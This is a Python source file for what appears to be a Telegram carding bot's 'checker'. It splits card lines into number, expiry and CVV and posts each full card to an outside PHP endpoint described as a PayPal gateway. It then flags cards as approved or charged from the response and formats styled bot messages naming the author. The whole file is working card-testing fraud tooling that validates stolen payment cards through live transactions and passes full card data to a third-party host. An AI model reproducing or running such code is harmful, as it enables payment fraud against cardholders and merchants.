import requests, time

def luhn_check(card_number):
	digits = [int(digit) for digit in card_number.replace(" ", "")][::-1]
	checksum = 0
	for i, digit in enumerate(digits):
		if i % 2 == 1:
			digit *= 2
			if digit > 9:
				  	digit -= 9
		checksum += digit
	return checksum % 10 == 0

def processcard(card_data):
	start_time = time.time()
	try:
		card_data = card_data.split('|')
		num = card_data[0]
		mon = card_data[1]
		year = card_data[2]
		cvv = card_data[3]
		if len(year) == 2:
			year = f'20{year}'
		else:
			year = card_data[2]
	except Exception:
		return f"{card_data}","Bad Format",False,"5",None
	card = f"{num}|{mon}|{year}|{cvv}"
#———–———–———–———–———–———#
	response2 = requests.post("https://alflim.org/mos999/pa.php?lista="+card)
	print(response2.text)
#——————————————————————#
	response2_text = response2.text
	end_time = time.time()
	execution_time = end_time - start_time
	send_by_bot = False
	
	msg_text = response2.json()["Response"]
	status = response2.json()["Status"]
	
	add_num = 5
	bot_msg = f"""
═════[  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs: {status}
⌬ ʀᴇsᴘᴏɴsᴇ: {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ: Paypal
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══	"""	#——————————————————————#
	if "Thanks for your purchase" in response2_text and "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅" in response2_text:
			msg_text = response2.json()["Response"]
			send_by_bot = True
			add_num = 1
			bot_msg = f"""
═════[  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs: {status}
⌬ ʀᴇsᴘᴏɴsᴇ: {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ: Paypal
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══	  """	#——————————————————————#
	elif "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅" in response2_text and "Thanks for your purchase" not in response2_text:
			msg_text = response2.json()["Response"]
			send_by_bot = True
			add_num = 2
			bot_msg = f"""
═════[  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs: {status}
⌬ ʀᴇsᴘᴏɴsᴇ: {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ: Paypal
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══	  """	#——————————————————————#
	else:
			msg_text = response2.json()["Response"]
			status = response2.json()["Status"]
			
			bot_msg = f"""
═════[ <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs: {status}
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Paypal
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══	"""
			print(response2.text)
	return f"{card}",msg_text,send_by_bot,add_num,f"{bot_msg}"